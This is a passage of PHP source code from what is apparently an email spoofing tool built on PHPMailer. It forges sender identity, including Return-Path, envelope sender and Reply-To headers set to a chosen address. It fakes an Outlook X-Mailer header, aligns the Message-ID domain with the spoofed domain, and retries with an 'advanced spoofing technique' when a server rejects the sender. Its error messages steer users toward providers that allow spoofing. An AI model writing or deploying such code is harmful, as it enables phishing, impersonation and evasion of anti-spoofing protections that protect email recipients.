                    file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Using combined approach with: {$senderEmail} as sender, display name showing spoofed address\n", FILE_APPEND);
                    $retryMail->setFrom($senderEmail, $spoofedFromName);

                    // Set other email fields
                    $retryMail->addAddress($emailData['to']);
                    $retryMail->Subject = $emailData['subject'];
                    $retryMail->isHTML(true);
                    $retryMail->Body = $mail->Body;
                    $retryMail->AltBody = $mail->AltBody;

                    // Add multiple reply-to headers to maximize the chances the reply goes to the spoofed address
                    $retryMail->addReplyTo($emailData['from_email'], $emailData['from_name']);
                    $retryMail->addCustomHeader('Reply-To', "{$emailData['from_name']} <{$emailData['from_email']}>");
                    $retryMail->addCustomHeader('Return-Path', "{$emailData['from_email']}");
                    $retryMail->addCustomHeader('X-Original-From', "{$emailData['from_name']} <{$emailData['from_email']}>");
                    $retryMail->addCustomHeader('X-Sender', "{$emailData['from_email']}");

                    // Add message headers to establish the spoofed identity 
                    $retryMail->addCustomHeader('X-Spoofed-By', "This message appears to be from {$emailData['from_email']} but was sent through {$senderEmail}");

                    // Add CC/BCC if present
                    if (!empty($emailData['cc'])) {
                        $ccAddresses = explode(',', $emailData['cc']);
                        foreach ($ccAddresses as $cc) {
                            if (filter_var(trim($cc), FILTER_VALIDATE_EMAIL)) {
                                $retryMail->addCC(trim($cc));
                            }
                        }
                    }

                    if (!empty($emailData['bcc'])) {
                        $bccAddresses = explode(',', $emailData['bcc']);
                        foreach ($bccAddresses as $bcc) {
                            if (filter_var(trim($bcc), FILTER_VALIDATE_EMAIL)) {
                                $retryMail->addBCC(trim($bcc));
                            }
                        }
                    }

                    // Process attachments
                    if (!empty($attachments) && is_array($attachments)) {
                        if (isset($attachments['name']) && is_array($attachments['name'])) {
                            for ($i = 0; $i < count($attachments['name']); $i++) {
                                $name = $attachments['name'][$i];
                                $tmpName = $attachments['tmp_name'][$i];
                                $error = $attachments['error'][$i];
                                $type = $attachments['type'][$i] ?? '';

                                if ($error === UPLOAD_ERR_OK && is_uploaded_file($tmpName)) {
                                    // Check if this is an image that should be embedded
                                    $isImage = strpos($type, 'image/') === 0;
                                    $shouldEmbed = isset($_POST['embed_images']) && $_POST['embed_images'] === 'yes';

                                    if ($isImage && $shouldEmbed) {
                                        // Generate a Content-ID for the image
                                        $cid = 'img_' . md5($name . time() . rand(0, 1000)) . '@' . $domain;

                                        // Add as embedded image
                                        try {
                                            $mail->addEmbeddedImage(
                                                $tmpName,
                                                $cid,
                                                $name,
                                                'base64',
                                                $type
                                            );

                                            // Replace image src in the HTML with the CID
                                            $imgPattern = '/<img([^>]*)src=["\']([^"\']*' . preg_quote(basename($name), '/') . ')["\']([^>]*)>/i';
                                            $replacement = '<img$1src="cid:' . $cid . '"$3>';
                                            $mail->Body = preg_replace($imgPattern, $replacement, $mail->Body);

                                            file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Added embedded image: {$name} with CID: {$cid}\n", FILE_APPEND);
                                        } catch (Exception $e) {
                                            file_put_contents($logFile, date('Y-m-d H:i:s') . " [ERROR]: Failed to embed image {$name}: " . $e->getMessage() . "\n", FILE_APPEND);

                                            // Fall back to regular attachment
                                            $mail->addAttachment(
                                                $tmpName,
                                                $name,
                                                'base64',
                                                $type
                                            );
                                        }
                                    } else {
                                        // Use a more reliable attachment method
                                        try {
                                            $mail->addAttachment(
                                                $tmpName,
                                                $name,
                                                'base64',
                                                $type
                                            );
                                            file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Added attachment: {$name}, Type: " . $type . ", Size: " . filesize($tmpName) . " bytes\n", FILE_APPEND);
                                        } catch (Exception $e) {
                                            file_put_contents($logFile, date('Y-m-d H:i:s') . " [ERROR]: Failed to add attachment {$name}: " . $e->getMessage() . "\n", FILE_APPEND);
                                        }
                                    }
                                } else {
                                    file_put_contents($logFile, date('Y-m-d H:i:s') . " [ERROR]: Upload error for attachment #{$i}: {$name}, Error code: {$error}\n", FILE_APPEND);
                                }
                            }
                        }
                    }

                    // Send the email with the modified approach
                    $retryResult = $retryMail->send();
                    file_put_contents($logFile, date('Y-m-d H:i:s') . " [SUCCESS]: Email sent successfully with alternative spoofing technique\n", FILE_APPEND);

                    return [
                        'success' => true,
                        'message' => 'Email sent successfully using an alternative spoofing technique.',
                        'message_id' => $retryMail->MessageID,
                        'spoofing_technique' => 'enhanced',
                        'notes' => 'The server required us to use a different technique to spoof the sender - recipients should still see your spoofed email address.'
                    ];
                } catch (Exception $retryException) {
                    file_put_contents($logFile, date('Y-m-d H:i:s') . " [ERROR]: Retry with alternative spoofing technique also failed: " . $retryException->getMessage() . "\n", FILE_APPEND);

                    $errorMessage = 'Sender address rejected: The email address you entered (' . $emailData['from_email'] . ') is not permitted by the SMTP server (' . $smtpSettings['username'] . ').' .
                        "\n\nThe service is actively preventing email spoofing. Try these solutions:" .
                        "\n\n1. Try a different SMTP provider that allows sender spoofing" .
                        "\n2. Use our Raw Email option instead of SMTP for maximum spoofing capabilities" .
                        "\n3. Try a provider that specializes in transactional emails with custom FROM addresses" .
                        "\n4. For testing, you can use your own email server where you control all the settings";
                }
            } elseif (strpos($errorMessage, 'data not accepted') !== false) {
                $suggestions = "This could be caused by:\n";
                $suggestions .= "1. Message content is being rejected by the server\n";
                $suggestions .= "2. Message contains content that triggered spam filters\n";
                $suggestions .= "3. Email size exceeds server limits\n";
                $suggestions .= "4. Server has restrictions on the number of recipients\n";
                $suggestions .= "5. Email headers contain invalid characters\n";

                // Provide a specific recommendation for the 'data not accepted' error
                $recommendations = "\n\nTry these solutions:\n";
                $recommendations .= "1. Simplify your email content (remove any complex formatting)\n";
                $recommendations .= "2. Try sending without attachments\n";
                $recommendations .= "3. Reduce the number of recipients\n";
                $recommendations .= "4. Check SMTP server logs for more details\n";
                $recommendations .= "5. Try a different SMTP provider\n";

                file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Providing data acceptance troubleshooting suggestions\n", FILE_APPEND);

                $errorMessage = 'Email server rejected the message. ' . $suggestions . $recommendations;
            }

            return [
                'success' => false,
                'message' => 'Exception: ' . $errorMessage,
                'error_detail' => $e->getMessage() // Include the original error for debugging
            ];
        }
    } catch (Exception $e) {
        file_put_contents($logFile, date('Y-m-d H:i:s') . " [ERROR]: " . $e->getMessage() . "\n", FILE_APPEND);
        file_put_contents($logFile, date('Y-m-d H:i:s') . " [ERROR]: Exception trace: " . $e->getTraceAsString() . "\n", FILE_APPEND);

        // More specific error for common issues
        $errorMessage = $e->getMessage();

        // Handle specific error cases with more user-friendly messages
        if (strpos($errorMessage, 'limit on the number of allowed outgoing messages was exceeded') !== false) {
            $errorMessage = "SMTP sending limit exceeded. The server has temporarily blocked sending because you've reached your daily email quota. Try these solutions:\n\n";
            $errorMessage .= "1. Wait a few hours before sending more emails\n";
            $errorMessage .= "2. Use a different SMTP server with higher limits\n";
            $errorMessage .= "3. Contact your SMTP provider to increase your sending quota";

            file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Identified quota limit issue\n", FILE_APPEND);
        } else if (strpos($errorMessage, 'Could not connect to SMTP host') !== false) {
            $suggestions = "Please check:\n";
            $suggestions .= "1. SMTP host name is correct\n";
            $suggestions .= "2. SMTP port is correct (common ports: 25, 465, 587)\n";
            $suggestions .= "3. Firewall is not blocking outgoing connections\n";
            $suggestions .= "4. The SMTP server is running and accessible\n";

            file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Providing connection troubleshooting suggestions\n", FILE_APPEND);

            $errorMessage = 'Could not connect to SMTP server. ' . $suggestions;
        } elseif (strpos($errorMessage, 'Authentication failed') !== false) {
            $suggestions = "Please check:\n";
            $suggestions .= "1. Username is correct\n";
            $suggestions .= "2. Password is correct\n";
            $suggestions .= "3. SMTP authentication is enabled on the server\n";
            $suggestions .= "4. The account is not locked or restricted\n";

            file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Providing authentication troubleshooting suggestions\n", FILE_APPEND);

            $errorMessage = 'SMTP authentication failed. ' . $suggestions;
        } elseif (strpos($errorMessage, 'Sender address rejected: not owned by user') !== false) {
            // This specific error occurs when the sender email doesn't match the authenticated user
            file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Sender address rejected error. Using advanced spoofing technique.\n", FILE_APPEND);

            // Try a different approach to bypass the sender verification
            try {
                // Create a new PHPMailer instance for the retry
                $retryMail = new PHPMailer(true);
                $retryMail->isSMTP();
                $retryMail->CharSet = 'UTF-8';
                $retryMail->Encoding = 'base64';
                $retryMail->XMailer = ' ';
                $retryMail->AllowEmpty = true;

                // Configure SMTP settings
                $retryMail->Host = $smtpSettings['host'];
                $retryMail->Port = $smtpSettings['port'];

                // Use the same encryption settings
                if (!empty($smtpSettings['encryption'])) {
                    if (strtolower($smtpSettings['encryption']) === 'tls') {
                        $retryMail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
                    } else if (strtolower($smtpSettings['encryption']) === 'ssl') {
                        $retryMail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;
                    } else {
                        $retryMail->SMTPSecure = $smtpSettings['encryption'];
                    }
                } else {
                    $retryMail->SMTPSecure = '';
                    $retryMail->SMTPAutoTLS = false;
                }

                // Authentication
                $retryMail->SMTPAuth = true;
                $retryMail->Username = $smtpSettings['username'];
                $retryMail->Password = $smtpSettings['password'];

                // Debug level
                $retryMail->SMTPDebug = $smtpSettings['debug_level'] ?? 0;
                if ($retryMail->SMTPDebug > 0) {
                    $retryMail->Debugoutput = function ($str, $level) use ($logFile) {
                        file_put_contents($logFile, date('Y-m-d H:i:s') . " [RETRY DEBUG]: {$str}\n", FILE_APPEND);
                    };
                }

                // SSL verification
                if (isset($smtpSettings['verify_ssl']) && $smtpSettings['verify_ssl'] === false) {
                    $retryMail->SMTPOptions = [
                        'ssl' => [
                            'verify_peer' => false,
                            'verify_peer_name' => false,
                            'allow_self_signed' => true
                        ]
                    ];
                }

                // Use a compromise approach:
                // 1. Use the SMTP username as the From address to pass authentication
                // 2. Set Reply-To header to the spoofed email for replies
                // 3. Make the display name include both the spoofed name and email
                $senderEmail = $smtpSettings['username'];

                // If username is not an email, construct one from the domain
                if (!filter_var($senderEmail, FILTER_VALIDATE_EMAIL) && strpos($smtpSettings['host'], '.') !== false) {
                    $domain = preg_replace('/^smtp\./', '', $smtpSettings['host']);
                    $senderEmail = $senderEmail . '@' . $domain;
                    file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Constructed sender email from username and domain: {$senderEmail}\n", FILE_APPEND);
                }

                // Create a from name that includes the spoofed email address
                $spoofedFromName = $emailData['from_name'] . " <" . $emailData['from_email'] . ">";

                file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Using combined approach with: {$senderEmail} as sender, display name showing spoofed address\n", FILE_APPEND);
                $retryMail->setFrom($senderEmail, $spoofedFromName);

                // Set other email fields
                $retryMail->addAddress($emailData['to']);
                $retryMail->Subject = $emailData['subject'];
                $retryMail->isHTML(true);
                $retryMail->Body = $mail->Body;
                $retryMail->AltBody = $mail->AltBody;

                // Add multiple reply-to headers to maximize the chances the reply goes to the spoofed address
                $retryMail->addReplyTo($emailData['from_email'], $emailData['from_name']);
                $retryMail->addCustomHeader('Reply-To', "{$emailData['from_name']} <{$emailData['from_email']}>");
                $retryMail->addCustomHeader('Return-Path', "{$emailData['from_email']}");
                $retryMail->addCustomHeader('X-Original-From', "{$emailData['from_name']} <{$emailData['from_email']}>");
                $retryMail->addCustomHeader('X-Sender', "{$emailData['from_email']}");

                // Add message headers to establish the spoofed identity 
                $retryMail->addCustomHeader('X-Spoofed-By', "This message appears to be from {$emailData['from_email']} but was sent through {$senderEmail}");

                // Add CC/BCC if present
                if (!empty($emailData['cc'])) {
                    $ccAddresses = explode(',', $emailData['cc']);
                    foreach ($ccAddresses as $cc) {
                        if (filter_var(trim($cc), FILTER_VALIDATE_EMAIL)) {
                            $retryMail->addCC(trim($cc));
                        }
                    }
                }

                if (!empty($emailData['bcc'])) {
                    $bccAddresses = explode(',', $emailData['bcc']);
                    foreach ($bccAddresses as $bcc) {
                        if (filter_var(trim($bcc), FILTER_VALIDATE_EMAIL)) {
                            $retryMail->addBCC(trim($bcc));
                        }
                    }
                }

                // Process attachments
                if (!empty($attachments) && is_array($attachments)) {
                    if (isset($attachments['name']) && is_array($attachments['name'])) {
                        for ($i = 0; $i < count($attachments['name']); $i++) {
                            $name = $attachments['name'][$i];
                            $tmpName = $attachments['tmp_name'][$i];
                            $error = $attachments['error'][$i];
                            $type = $attachments['type'][$i] ?? '';

                            if ($error === UPLOAD_ERR_OK && is_uploaded_file($tmpName)) {
                                // Check if this is an image that should be embedded
                                $isImage = strpos($type, 'image/') === 0;
                                $shouldEmbed = isset($_POST['embed_images']) && $_POST['embed_images'] === 'yes';

                                if ($isImage && $shouldEmbed) {
                                    // Generate a Content-ID for the image
                                    $cid = 'img_' . md5($name . time() . rand(0, 1000)) . '@' . $domain;

                                    // Add as embedded image
                                    try {
                                        $mail->addEmbeddedImage(
                                            $tmpName,
                                            $cid,
                                            $name,
                                            'base64',
                                            $type
                                        );

                                        // Replace image src in the HTML with the CID
                                        $imgPattern = '/<img([^>]*)src=["\']([^"\']*' . preg_quote(basename($name), '/') . ')["\']([^>]*)>/i';
                                        $replacement = '<img$1src="cid:' . $cid . '"$3>';
                                        $mail->Body = preg_replace($imgPattern, $replacement, $mail->Body);

                                        file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Added embedded image: {$name} with CID: {$cid}\n", FILE_APPEND);
                                    } catch (Exception $e) {
                                        file_put_contents($logFile, date('Y-m-d H:i:s') . " [ERROR]: Failed to embed image {$name}: " . $e->getMessage() . "\n", FILE_APPEND);

                                        // Fall back to regular attachment
                                        $mail->addAttachment(
                                            $tmpName,
                                            $name,
                                            'base64',
                                            $type
                                        );
                                    }
                                } else {
                                    // Use a more reliable attachment method
                                    try {
                                        $mail->addAttachment(
                                            $tmpName,
                                            $name,
                                            'base64',
                                            $type
                                        );
                                        file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Added attachment: {$name}, Type: " . $type . ", Size: " . filesize($tmpName) . " bytes\n", FILE_APPEND);
                                    } catch (Exception $e) {
                                        file_put_contents($logFile, date('Y-m-d H:i:s') . " [ERROR]: Failed to add attachment {$name}: " . $e->getMessage() . "\n", FILE_APPEND);
                                    }
                                }
                            } else {
                                file_put_contents($logFile, date('Y-m-d H:i:s') . " [ERROR]: Upload error for attachment #{$i}: {$name}, Error code: {$error}\n", FILE_APPEND);
                            }
                        }
                    }
                }

                // Send the email with the modified approach
                $retryResult = $retryMail->send();
                file_put_contents($logFile, date('Y-m-d H:i:s') . " [SUCCESS]: Email sent successfully with alternative spoofing technique\n", FILE_APPEND);

                return [
                    'success' => true,
                    'message' => 'Email sent successfully using an alternative spoofing technique.',
                    'message_id' => $retryMail->MessageID,
                    'spoofing_technique' => 'enhanced',
                    'notes' => 'The server required us to use a different technique to spoof the sender - recipients should still see your spoofed email address.'
                ];
            } catch (Exception $retryException) {
                file_put_contents($logFile, date('Y-m-d H:i:s') . " [ERROR]: Retry with alternative spoofing technique also failed: " . $retryException->getMessage() . "\n", FILE_APPEND);

                $errorMessage = 'Sender address rejected: The email address you entered (' . $emailData['from_email'] . ') is not permitted by the SMTP server (' . $smtpSettings['username'] . ').' .
                    "\n\nThe service is actively preventing email spoofing. Try these solutions:" .
                    "\n\n1. Try a different SMTP provider that allows sender spoofing" .
                    "\n2. Use our Raw Email option instead of SMTP for maximum spoofing capabilities" .
                    "\n3. Try a provider that specializes in transactional emails with custom FROM addresses" .
                    "\n4. For testing, you can use your own email server where you control all the settings";
            }
        } elseif (strpos($errorMessage, 'data not accepted') !== false) {
            $suggestions = "This could be caused by:\n";
            $suggestions .= "1. Message content is being rejected by the server\n";
            $suggestions .= "2. Message contains content that triggered spam filters\n";
            $suggestions .= "3. Email size exceeds server limits\n";
            $suggestions .= "4. Server has restrictions on the number of recipients\n";
            $suggestions .= "5. Email headers contain invalid characters\n";

            // Provide a specific recommendation for the 'data not accepted' error
            $recommendations = "\n\nTry these solutions:\n";
            $recommendations .= "1. Simplify your email content (remove any complex formatting)\n";
            $recommendations .= "2. Try sending without attachments\n";
            $recommendations .= "3. Reduce the number of recipients\n";
            $recommendations .= "4. Check SMTP server logs for more details\n";
            $recommendations .= "5. Try a different SMTP provider\n";

            file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Providing data acceptance troubleshooting suggestions\n", FILE_APPEND);

            $errorMessage = 'Email server rejected the message. ' . $suggestions . $recommendations;
        }

        return [
            'success' => false,
            'message' => 'Exception: ' . $errorMessage,
            'error_detail' => $e->getMessage() // Include the original error for debugging
        ];
    }
}

/**
 * Save SMTP settings to session
 * 
 * @param array $smtpSettings SMTP settings
 * @return array Response with status and message
 */
function saveSmtpSettings($smtpSettings)
{
    try {
        // Debug log
        error_log("Saving SMTP settings: " . json_encode($smtpSettings));

        // Start session if not already started
        if (session_status() == PHP_SESSION_NONE && !headers_sent()) {
            session_start();
        }

        // Create custom settings array in session if it doesn't exist
        if (!isset($_SESSION['custom_settings'])) {
            $_SESSION['custom_settings'] = [];
        }

        // Update SMTP settings - ensure we have the correct field mappings
        $_SESSION['custom_settings']['smtp'] = [
            'host' => $smtpSettings['host'] ?? '',
            'port' => $smtpSettings['port'] ?? 587,
            'security' => $smtpSettings['encryption'] ?? 'tls', // Map encryption to security
            'encryption' => $smtpSettings['encryption'] ?? 'tls', // Keep both for compatibility
            'username' => $smtpSettings['username'] ?? '',
            'password' => $smtpSettings['password'] ?? '',
            'debug' => $smtpSettings['debug_level'] ?? 0, // Map debug_level to debug
            'debug_level' => $smtpSettings['debug_level'] ?? 0, // Keep both for compatibility
            'verify_ssl' => $smtpSettings['verify_ssl'] ?? false
        ];

        // Debug log after saving
        error_log("SMTP settings saved to session: " . json_encode($_SESSION['custom_settings']['smtp']));

        // DO NOT call session_write_close() here, keeping session open

        return [
            'status' => 'success',
            'message' => 'SMTP settings saved successfully!'
        ];
    } catch (Exception $e) {
        error_log("Error saving SMTP settings: " . $e->getMessage());
        return [
            'status' => 'error',
            'message' => 'Error saving SMTP settings: ' . $e->getMessage()
        ];
    }
}

/**
 * Get current SMTP settings from config or session
 * 
 * @return array SMTP settings
 */
function getSmtpSettings()
{
    // Start session if not already started
    if (session_status() == PHP_SESSION_NONE && !headers_sent()) {
        session_start();
    }

    // Get default SMTP settings from config
    $defaultSettings = [
        'host' => config('smtp.host', ''),
        'port' => config('smtp.port', 587),
        'security' => config('smtp.encryption', 'tls'),
        'encryption' => config('smtp.encryption', 'tls'), // Keep both for compatibility
        'username' => config('smtp.username', ''),
        'password' => config('smtp.password', ''),
        'debug' => config('smtp.debug_level', 0),
        'debug_level' => config('smtp.debug_level', 0), // Keep both for compatibility
        'verify_ssl' => config('smtp.verify_ssl', false)
    ];

    // Check if we have custom SMTP settings in session
    if (isset($_SESSION['custom_settings']) && isset($_SESSION['custom_settings']['smtp'])) {
        $sessionSettings = $_SESSION['custom_settings']['smtp'];
        error_log("Found SMTP settings in session: " . json_encode($sessionSettings));
    } else {
        $sessionSettings = [];
        error_log("No SMTP settings found in session, using defaults");
    }

    // Merge session settings with default settings (session takes precedence)
    $mergedSettings = array_merge($defaultSettings, $sessionSettings);

    // Ensure consistent field naming regardless of source
    if (isset($mergedSettings['encryption']) && !isset($mergedSettings['security'])) {
        $mergedSettings['security'] = $mergedSettings['encryption'];
    } else if (isset($mergedSettings['security']) && !isset($mergedSettings['encryption'])) {
        $mergedSettings['encryption'] = $mergedSettings['security'];
    }

    if (isset($mergedSettings['debug_level']) && !isset($mergedSettings['debug'])) {
        $mergedSettings['debug'] = $mergedSettings['debug_level'];
    } else if (isset($mergedSettings['debug']) && !isset($mergedSettings['debug_level'])) {
        $mergedSettings['debug_level'] = $mergedSettings['debug'];
    }

    error_log("Returning merged SMTP settings: " . json_encode($mergedSettings));
    return $mergedSettings;
}

/**
 * Test SMTP connection without sending an email
 * 
 * @param array $smtpSettings SMTP settings
 * @return array Response with status and message
 */
function testSmtpConnection($smtpSettings)
{
    // Create error log file if it doesn't exist
    $logFile = config('logging.dir', __DIR__ . '/../logs') . '/smtp_test.log';
    $logDir = dirname($logFile);
    if (!file_exists($logDir)) {
        mkdir($logDir, 0755, true);
    }

    // Start logging
    file_put_contents($logFile, "[" . date('Y-m-d H:i:s') . "] Starting SMTP connection test\n", FILE_APPEND);
    file_put_contents($logFile, "[" . date('Y-m-d H:i:s') . "] Host: {$smtpSettings['host']}, Port: {$smtpSettings['port']}, Security: {$smtpSettings['encryption']}\n", FILE_APPEND);

    try {
        // Initialize PHPMailer
        $mail = new PHPMailer(true);

        // Enable debug output
        $mail->SMTPDebug = $smtpSettings['debug_level'];
        $mail->Debugoutput = function ($str, $level) use ($logFile) {
            file_put_contents($logFile, "[" . date('Y-m-d H:i:s') . "] [Debug-$level] $str\n", FILE_APPEND);
        };

        // Server settings
        $mail->isSMTP();
        $mail->Host = $smtpSettings['host'];
        $mail->Port = $smtpSettings['port'];
        $mail->SMTPSecure = $smtpSettings['encryption'];
        $mail->SMTPAuth = !empty($smtpSettings['username']);

        // Only set username/password if provided
        if (!empty($smtpSettings['username'])) {
            $mail->Username = $smtpSettings['username'];
            $mail->Password = $smtpSettings['password'];
        }

        // SSL verification
        $mail->SMTPOptions = [
            'ssl' => [
                'verify_peer' => $smtpSettings['verify_ssl'] ?? true,
                'verify_peer_name' => $smtpSettings['verify_ssl'] ?? true,
                'allow_self_signed' => !($smtpSettings['verify_ssl'] ?? true)
            ]
        ];

        // Connect only, don't send email
        $mail->smtpConnect();

        // If we got here, connection was successful
        file_put_contents($logFile, "[" . date('Y-m-d H:i:s') . "] SMTP connection test successful\n", FILE_APPEND);
        return [
            'status' => 'success',
            'message' => 'Successfully connected to SMTP server.',
            'details' => [
                'host' => $smtpSettings['host'],
                'port' => $smtpSettings['port'],
                'encryption' => $smtpSettings['encryption'],
                'auth' => !empty($smtpSettings['username'])
            ]
        ];
    } catch (Exception $e) {
        // Log the error
        $errorMsg = $e->getMessage();
        file_put_contents($logFile, "[" . date('Y-m-d H:i:s') . "] SMTP connection failed: $errorMsg\n", FILE_APPEND);

        return [
            'status' => 'error',
            'message' => "Failed to connect to SMTP server: $errorMsg",
            'details' => [
                'host' => $smtpSettings['host'],
                'port' => $smtpSettings['port'],
                'encryption' => $smtpSettings['encryption'],
                'auth' => !empty($smtpSettings['username'])
            ]
        ];
    }
}

/**
 * Format a Message-ID string to ensure it's properly formatted with angle brackets
 * 
 * @param string $messageId The Message-ID to format
 * @return string Properly formatted Message-ID
 */
function formatMessageId($messageId)
{
    $messageId = trim($messageId);

    // Add opening angle bracket if missing
    if (!empty($messageId) && strpos($messageId, '<') !== 0) {
        $messageId = '<' . $messageId;
    }

    // Add closing angle bracket if missing
    if (!empty($messageId) && substr($messageId, -1) !== '>') {
        $messageId .= '>';
    }

    return $messageId;
}

/**
 * Send email using PHP's mail() function
 *
 * @param array $emailData Email data
 * @param array $attachments Attachments
 * @return array Result status and message
 */
function sendWithMail($emailData, $attachments = [])
{
    $logFile = __DIR__ . '/../logs/mail.log';

    // Create logs directory if it doesn't exist
    if (!is_dir(dirname($logFile))) {
        mkdir(dirname($logFile), 0755, true);
    }

    file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Sending email via PHP mail()\n", FILE_APPEND);

    try {
        // Check if mail() function exists
        if (!function_exists('mail')) {
            file_put_contents($logFile, date('Y-m-d H:i:s') . " [ERROR]: PHP mail() function is not available in this environment\n", FILE_APPEND);
            return [
                'success' => false,
                'message' => 'The mail() function is not available in this environment. Please use SMTP sending method instead.'
            ];
        }

        // If mail() exists, use PHPMailer's mail transport for better features
        $mail = new PHPMailer(true);

        try {
            $mail->isMail(); // Use PHP mail()
        } catch (Exception $e) {
            // If isMail() fails, log the error but don't fall back to another method
            file_put_contents($logFile, date('Y-m-d H:i:s') . " [ERROR]: Could not use mail() transport: " . $e->getMessage() . "\n", FILE_APPEND);
            return [
                'success' => false,
                'message' => 'Could not use mail() transport: ' . $e->getMessage() . '. Please use SMTP sending method instead.'
            ];
        }

        // Set up from
        $fromName = !empty($emailData['from_name']) ? $emailData['from_name'] : '';
        $mail->setFrom($emailData['from_email'], $fromName);

        // Set reply-to if provided
        if (!empty($emailData['reply_to'])) {
            $mail->addReplyTo($emailData['reply_to']);
            file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Setting Reply-To: {$emailData['reply_to']}\n", FILE_APPEND);
        }

        // Set recipients
        $mail->addAddress($emailData['to']);

        // Set CC if provided
        if (!empty($emailData['cc'])) {
            $ccAddresses = explode(',', $emailData['cc']);
            foreach ($ccAddresses as $cc) {
                $cc = trim($cc);
                if (filter_var($cc, FILTER_VALIDATE_EMAIL)) {
                    $mail->addCC($cc);
                }
            }
        }

        // Set BCC if provided
        if (!empty($emailData['bcc'])) {
            $bccAddresses = explode(',', $emailData['bcc']);
            foreach ($bccAddresses as $bcc) {
                $bcc = trim($bcc);
                if (filter_var($bcc, FILTER_VALIDATE_EMAIL)) {
                    $mail->addBCC($bcc);
                }
            }
        }

        // Set subject and body
        $mail->Subject = $emailData['subject'];
        $mail->isHTML(true);
        $mail->Body = $emailData['message'];
        $mail->AltBody = strip_tags($emailData['message']);

        // Set character set
        $mail->CharSet = 'UTF-8';
        $mail->Encoding = 'base64';

        // Add custom headers for threading
        if (!empty($emailData['references'])) {
            $mail->addCustomHeader('References', $emailData['references']);
        }

        if (!empty($emailData['in_reply_to'])) {
            $mail->addCustomHeader('In-Reply-To', $emailData['in_reply_to']);
        }

        // Generate a unique Message-ID
        $domain = explode('@', $emailData['from_email'])[1] ?? 'example.com';
        $mail->MessageID = '<' . uniqid(rand(), true) . '@' . $domain . '>';

        // Add attachments if any
        if (!empty($attachments) && is_array($attachments)) {
            // Handle array format from $_FILES
            if (isset($attachments['name']) && is_array($attachments['name'])) {
                foreach ($attachments['name'] as $i => $name) {
                    if ($attachments['error'][$i] === UPLOAD_ERR_OK && is_uploaded_file($attachments['tmp_name'][$i])) {
                        $mail->addAttachment(
                            $attachments['tmp_name'][$i],
                            $attachments['name'][$i],
                            'base64',
                            $attachments['type'][$i]
                        );
                    }
                }
            }
            // Handle simple array of file paths
            else {
                foreach ($attachments as $attachment) {
                    $mail->addAttachment($attachment);
                }
            }
        }

        // Send the email
        // Apply stealth enhancements
        if (function_exists("enhanceSpoofedEmail")) {
            $mail = enhanceSpoofedEmail($mail, $emailData["from_email"], !empty($emailData["from_name"]) ? $emailData["from_name"] : "", $logFile);
            file_put_contents($logFile, date("Y-m-d H:i:s") . " [INFO]: Advanced spoofing enhancements applied\n", FILE_APPEND);
        }

        $success = $mail->send();
        if ($success) {
            file_put_contents($logFile, date('Y-m-d H:i:s') . " [SUCCESS]: Email sent successfully\n", FILE_APPEND);
            return [
                'success' => true,
                'message' => 'Email sent successfully!',
                'message_id' => $mail->MessageID
            ];
        } else {
            file_put_contents($logFile, date('Y-m-d H:i:s') . " [ERROR]: Failed to send email\n", FILE_APPEND);
            return [
                'success' => false,
                'message' => 'Failed to send email'
            ];
        }
    } catch (Exception $e) {
        file_put_contents($logFile, date('Y-m-d H:i:s') . " [ERROR]: " . $e->getMessage() . "\n", FILE_APPEND);

        // Check for mail function error
        if (
            strpos($e->getMessage(), 'Could not instantiate mail function') !== false ||
            strpos($e->getMessage(), 'mail() has been disabled') !== false
        ) {
            file_put_contents($logFile, date('Y-m-d H:i:s') . " [ERROR]: The mail() function failed: " . $e->getMessage() . "\n", FILE_APPEND);

            return [
                'success' => false,
                'message' => 'The PHP mail() function failed: ' . $e->getMessage() . '. Please use SMTP sending method instead.'
            ];
        }

        return [
            'success' => false,
            'message' => 'Exception: ' . $e->getMessage()
        ];
    }
}

/**
 * Generate a unique Message-ID for an email
 * 
 * @param string $domain Domain to use in the Message-ID
 * @return string Formatted Message-ID with angle brackets
 */
function generateMessageId($domain)
{
    // Generate a unique ID
    $uniqueId = uniqid(rand(), true);

    // Format with angle brackets
    return '<' . $uniqueId . '@' . $domain . '>';
}

/**
 * Add headers to improve email deliverability and bypass spam filters
 * 
 * @param PHPMailer $mail PHPMailer object
 * @param array $emailData Email data
 * @param string $logFile Log file path
 * @return PHPMailer Modified PHPMailer object
 */
function enhanceEmailDeliverability($mail, $emailData, $logFile = null)
{
    // Generate a message timestamp for various headers
    $timestamp = date('D, j M Y H:i:s O');

    // Log function if logFile is provided
    $log = function ($message) use ($logFile) {
        if ($logFile) {
            file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: " . $message . "\n", FILE_APPEND);
        }
    };

    // Add Date header with current timestamp
    $mail->addCustomHeader('Date', $timestamp);
    $log("Added Date header: " . $timestamp);

    // Critical: Configure headers for maximum spoofing effectiveness

    // For proper spoofing, we need consistent domain alignment
    $fromDomain = explode('@', $emailData['from_email'])[1] ?? 'example.com';
    $log("Using domain for Message-ID: " . $fromDomain);

    // Generate perfect Message-ID format from spoofed domain
    $messageId = '<' . time() . '.' . md5(uniqid(rand(), true)) . '@' . $fromDomain . '>';
    $mail->MessageID = $messageId;
    $log("Added Message-ID with domain alignment: " . $messageId);

    // Do NOT set the Sender/Return-Path to anything other than the spoofed email
    // This is crucial - many anti-spoofing systems check this alignment
    $mail->Sender = $emailData['from_email'];
    $log("Set envelope sender to match From header: " . $emailData['from_email']);

    // Set a convincing X-Mailer value for the spoofed sender's supposed email client
    $mail->XMailer = 'Microsoft Outlook 16.0';
    $log("Set X-Mailer to appear as legitimate client: Microsoft Outlook 16.0");

    // Add common headers found in legitimate emails
    $mail->addCustomHeader('X-Priority', '3');
